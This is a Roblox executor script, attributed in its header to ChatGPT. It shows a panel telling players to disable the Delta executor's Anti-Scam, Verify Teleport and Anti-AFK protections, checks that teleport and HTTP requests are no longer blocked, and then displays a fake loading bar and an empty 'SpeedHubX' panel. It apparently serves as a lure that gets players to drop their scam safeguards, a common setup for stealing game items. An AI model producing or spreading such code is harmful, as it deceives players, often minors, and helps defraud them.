-- // Gui + Scripted Flow by ChatGPT // --

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local player = Players.LocalPlayer

-- Create ScreenGui
local gui = Instance.new("ScreenGui")
gui.Parent = game.CoreGui

-- Create First Panel (Instruction Window)
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 250)
frame.Position = UDim2.new(0.5, -200, 0.5, -125)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 0
frame.Parent = gui

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 40)
title.Position = UDim2.new(0, 10, 0, 10)
title.Text = "Turn off all the following Delta settings, or the script will fail."
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.TextScaled = true
title.Font = Enum.Font.SourceSansBold
title.BackgroundTransparency = 1
title.Parent = frame

local instructions = Instance.new("TextLabel")
instructions.Size = UDim2.new(1, -20, 0, 100)
instructions.Position = UDim2.new(0, 10, 0, 60)
instructions.Text = "• Disable Anti-AFK\n• Disable Verify Teleport\n• Disable Anti-Scam\n\nAfter disabling, check the box and press Confirm or Rejoin."
instructions.TextColor3 = Color3.fromRGB(255, 255, 255)
instructions.TextScaled = true
instructions.Font = Enum.Font.SourceSans
instructions.BackgroundTransparency = 1
instructions.TextYAlignment = Enum.TextYAlignment.Top
instructions.Parent = frame

-- Checkbox
local checkBox = Instance.new("TextButton")
checkBox.Size = UDim2.new(0, 30, 0, 30)
checkBox.Position = UDim2.new(0, 20, 1, -50)
checkBox.Text = ""
checkBox.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
checkBox.Parent = frame

local checked = false
checkBox.MouseButton1Click:Connect(function()
    checked = not checked
    if checked then
        checkBox.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    else
        checkBox.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    end
end)

-- Confirm + Rejoin Buttons
local confirmButton = Instance.new("TextButton")
confirmButton.Size = UDim2.new(0, 120, 0, 40)
confirmButton.Position = UDim2.new(1, -270, 1, -50)
confirmButton.Text = "Confirm"
confirmButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
confirmButton.Parent = frame

local rejoinButton = Instance.new("TextButton")
rejoinButton.Size = UDim2.new(0, 120, 0, 40)
rejoinButton.Position = UDim2.new(1, -140, 1, -50)
rejoinButton.Text = "Rejoin"
rejoinButton.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
rejoinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
rejoinButton.Parent = frame

-- Utility: Create popup
local function createWarning(text)
    local warnFrame = Instance.new("Frame")
    warnFrame.Size = UDim2.new(0, 350, 0, 150)
    warnFrame.Position = UDim2.new(0.5, -175, 0.5, -75)
    warnFrame.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    warnFrame.Parent = gui

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -20, 1, -20)
    lbl.Position = UDim2.new(0, 10, 0, 10)
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextScaled = true
    lbl.Font = Enum.Font.SourceSansBold
    lbl.BackgroundTransparency = 1
    lbl.Parent = warnFrame

    local ok = Instance.new("TextButton")
    ok.Size = UDim2.new(0, 100, 0, 30)
    ok.Position = UDim2.new(0.5, -50, 1, -40)
    ok.Text = "OK"
    ok.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
    ok.TextColor3 = Color3.fromRGB(255, 255, 255)
    ok.Parent = warnFrame

    ok.MouseButton1Click:Connect(function()
        warnFrame:Destroy()
    end)
end

-- Stage 2: Loading Screen
local function loadingScreen()
    frame.Visible = false
    local loadFrame = Instance.new("Frame")
    loadFrame.Size = UDim2.new(0, 400, 0, 150)
    loadFrame.Position = UDim2.new(0.5, -200, 0.5, -75)
    loadFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    loadFrame.Parent = gui

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, 0, 0, 50)
    lbl.Position = UDim2.new(0, 0, 0, 10)
    lbl.Text = "Loading GAG Script..."
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.Font = Enum.Font.SourceSansBold
    lbl.TextScaled = true
    lbl.BackgroundTransparency = 1
    lbl.Parent = loadFrame

    local barBack = Instance.new("Frame")
    barBack.Size = UDim2.new(0.8, 0, 0, 20)
    barBack.Position = UDim2.new(0.1, 0, 0, 70)
    barBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    barBack.Parent = loadFrame

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0, 0, 1, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    barFill.Parent = barBack

    local percent = Instance.new("TextLabel")
    percent.Size = UDim2.new(1, 0, 0, 30)
    percent.Position = UDim2.new(0, 0, 1, -30)
    percent.Text = "0%"
    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
    percent.TextScaled = true
    percent.Font = Enum.Font.SourceSans
    percent.BackgroundTransparency = 1
    percent.Parent = loadFrame

    for i = 1, 100 do
        barFill.Size = UDim2.new(i/100, 0, 1, 0)
        percent.Text = i .. "%"
        wait(0.05) -- 100 * 0.05 = 5s
    end

    loadFrame:Destroy()

    -- Stage 3 Panel
    local panel = Instance.new("Frame")
    panel.Size = UDim2.new(0, 400, 0, 200)
    panel.Position = UDim2.new(0.5, -200, 0.5, -100)
    panel.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    panel.Parent = gui

    local nameLbl = Instance.new("TextLabel")
    nameLbl.Size = UDim2.new(1, 0, 0, 50)
    nameLbl.Position = UDim2.new(0, 0, 0, 10)
    nameLbl.Text = "SpeedHubX"
    nameLbl.TextColor3 = Color3.fromRGB(0, 200, 255)
    nameLbl.Font = Enum.Font.SourceSansBold
    nameLbl.TextScaled = true
    nameLbl.BackgroundTransparency = 1
    nameLbl.Parent = panel

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(1, 0, 0, 30)
    subtitle.Position = UDim2.new(0, 0, 0, 70)
    subtitle.Text = "Auto Middle"
    subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
    subtitle.Font = Enum.Font.SourceSansItalic
    subtitle.TextScaled = true
    subtitle.BackgroundTransparency = 1
    subtitle.Parent = panel
end

-- Detection Function
local function checkExecutor()
    -- Test Teleport
    local teleportBlocked = false
    local successTeleport = pcall(function()
        TeleportService:Teleport(game.PlaceId, player)
    end)
    if not successTeleport then teleportBlocked = true end

    -- Test HttpGet
    local httpBlocked = false
    local successHttp = pcall(function()
        game:HttpGet("https://httpbin.org/get")
    end)
    if not successHttp then httpBlocked = true end

    -- If any blocked, return false
    return not (teleportBlocked or httpBlocked)
end

-- Button Logic
confirmButton.MouseButton1Click:Connect(function()
    if not checked then return end
    confirmButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)

    if checkExecutor() then
        loadingScreen()
    else
        createWarning("Your executor might still have Verify Teleport / Anti-Scam enabled. Please disable these.")
    end
end)

rejoinButton.MouseButton1Click:Connect(function()
    if not checked then return end
    rejoinButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
    TeleportService:Teleport(game.PlaceId, player)
end)
